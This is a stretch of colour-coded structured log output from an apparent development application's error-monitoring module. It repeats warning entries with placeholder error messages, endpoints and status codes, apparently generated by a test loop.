WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.921240Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m87[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4338'[0m [36merror_type[0m=[35merror_type_38[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_38[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m538[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.921296Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m87[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4339'[0m [36merror_type[0m=[35merror_type_39[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_39[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m539[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.921349Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m87[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4340'[0m [36merror_type[0m=[35merror_type_40[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_40[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m540[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.921401Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m87[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4341'[0m [36merror_type[0m=[35merror_type_41[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_41[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m541[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.921452Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m87[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4342'[0m [36merror_type[0m=[35merror_type_42[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_42[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m542[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.921501Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m87[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4343'[0m [36merror_type[0m=[35merror_type_43[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_43[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m543[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.921551Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m87[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4344'[0m [36merror_type[0m=[35merror_type_44[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_44[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m544[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.921601Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m87[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4345'[0m [36merror_type[0m=[35merror_type_45[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_45[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m545[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.921651Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m87[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4346'[0m [36merror_type[0m=[35merror_type_46[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_46[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m546[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.921699Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m87[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4347'[0m [36merror_type[0m=[35merror_type_47[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_47[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m547[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.921748Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m87[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4348'[0m [36merror_type[0m=[35merror_type_48[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_48[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m548[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.921796Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m87[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4349'[0m [36merror_type[0m=[35merror_type_49[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_49[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m549[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.921844Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m88[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4350'[0m [36merror_type[0m=[35merror_type_0[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_50[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m550[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.921901Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m88[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4351'[0m [36merror_type[0m=[35merror_type_1[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_51[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m551[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.921953Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m88[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4352'[0m [36merror_type[0m=[35merror_type_2[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_52[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m552[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.922003Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m88[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4353'[0m [36merror_type[0m=[35merror_type_3[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_53[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m553[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.922068Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m88[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4354'[0m [36merror_type[0m=[35merror_type_4[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_54[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m554[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.922162Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m88[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4355'[0m [36merror_type[0m=[35merror_type_5[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_55[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m555[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.922275Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m88[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4356'[0m [36merror_type[0m=[35merror_type_6[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_56[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m556[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.922356Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m88[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4357'[0m [36merror_type[0m=[35merror_type_7[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_57[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m557[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.922419Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m88[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4358'[0m [36merror_type[0m=[35merror_type_8[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_58[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m558[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.922471Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m88[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4359'[0m [36merror_type[0m=[35merror_type_9[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_59[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m559[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.922521Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m88[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4360'[0m [36merror_type[0m=[35merror_type_10[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_60[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m560[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.922571Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m88[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4361'[0m [36merror_type[0m=[35merror_type_11[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_61[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m561[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.922622Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m88[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4362'[0m [36merror_type[0m=[35merror_type_12[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_62[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m562[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.922678Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m88[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4363'[0m [36merror_type[0m=[35merror_type_13[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_63[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m563[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.922732Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m88[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4364'[0m [36merror_type[0m=[35merror_type_14[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_64[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m564[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.922783Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m88[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4365'[0m [36merror_type[0m=[35merror_type_15[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_65[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m565[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.922832Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m88[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4366'[0m [36merror_type[0m=[35merror_type_16[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_66[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m566[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.922881Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m88[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4367'[0m [36merror_type[0m=[35merror_type_17[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_67[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m567[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.922932Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m88[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4368'[0m [36merror_type[0m=[35merror_type_18[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_68[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m568[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.922984Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m88[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4369'[0m [36merror_type[0m=[35merror_type_19[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_69[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m569[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.923034Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m88[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4370'[0m [36merror_type[0m=[35merror_type_20[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_70[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m570[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.923084Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m88[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4371'[0m [36merror_type[0m=[35merror_type_21[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_71[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m571[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.923133Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m88[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4372'[0m [36merror_type[0m=[35merror_type_22[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_72[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m572[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.923182Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m88[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4373'[0m [36merror_type[0m=[35merror_type_23[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_73[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m573[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.923232Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m88[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4374'[0m [36merror_type[0m=[35merror_type_24[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_74[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m574[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.923283Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m88[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4375'[0m [36merror_type[0m=[35merror_type_25[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_75[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m575[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.923332Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m88[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4376'[0m [36merror_type[0m=[35merror_type_26[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_76[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m576[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.923431Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m88[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4377'[0m [36merror_type[0m=[35merror_type_27[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_77[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m577[0m
